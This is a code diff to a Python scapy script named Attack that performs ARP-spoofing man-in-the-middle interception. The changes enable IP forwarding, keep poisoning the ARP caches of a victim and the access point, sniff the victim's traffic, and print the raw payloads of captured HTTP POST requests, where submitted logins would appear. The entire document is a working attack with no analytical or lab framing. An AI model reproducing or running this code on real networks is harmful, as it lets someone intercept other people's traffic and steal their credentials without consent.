@@ -31,6 +31,14 @@ class Attack():
         packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
         scapy.send(packet,verbose=0)
 
+    def enable_ip_route(self):
+        file_path = "/proc/sys/net/ipv4/ip_forward"
+        with open(file_path) as f:
+            if f.read() == 1:
+                return
+        with open(file_path, "w") as f:
+            print(1, file=f)
+
     def restore(self, dest_ip, src_ip):
         dest_mac = self.ip_mac[dest_ip]
         src_mac = self.ip_mac[src_ip]
@@ -38,31 +46,41 @@ class Attack():
         scapy.send(packet,count=4,verbose=0)
 
     def process_packet(self,packet):
-        print('get {}'.format(packet))
         if packet.haslayer(HTTPRequest):
             method = packet[HTTPRequest].Method.decode()
             if packet.haslayer(scapy.Raw) and method == "POST":
                 print("\nRaw Data: ", packet[scapy.Raw].load)
+        #if packet[scapy.Ether].src == self.ip_mac[self.victim]:	
+        #    packet[scapy.Ether].dst = self.ip_mac[self.ap]
+        #if packet[scapy.Ether].src == self.ip_mac[self.ap]:
+        #    packet[scapy.Ether].dst = self.ip_mac[self.victim]
+        #packet[scapy.Ether].src = self.ip_mac[self.attacker]        
         #scapy.send(packet,verbose=0)
 
-    def sniff_packets(self):
-        scapy.sniff(filter="port 80", prn=self.process_packet, iface=self.interfaces[1], store=False)
+    def sniff_packet(self):
+        while 1:
+            scapy.sniff(filter="host "+self.victim, prn=self.process_packet, iface=self.interfaces[1])
+            scapy.sniff(filter="host "+self.ap, prn=self.process_packet, iface=self.interfaces[1])
 
     def arp_spoofing(self):
         while 1:
             self.spoof(self.victim, self.ap)
             self.spoof(self.ap, self.victim)
-            time.sleep(2)
+            scapy.sniff(filter="host "+self.victim, prn=self.process_packet, iface='ens33')
+            time.sleep(1)
 
     def ret_arp_spoofing(self):
         self.restore(self.ap, self.victim)
         self.restore(self.victim, self.ap)
-        time.sleep(2)
 
 attack = Attack()
 attack.get_ip()
 attack.get_mac(attack.network[1])
+attack.enable_ip_route()
 print(attack.ip_list, '\n', attack.ip_mac, '\n', attack.network)
-#attack.arp_spoofing()
-attack.sniff_packets()
+try:
+    attack.arp_spoofing()
+    #attack.sniff_packet()
+except KeyboardInterrupt:
+    attack.ret_arp_spoofing()
 
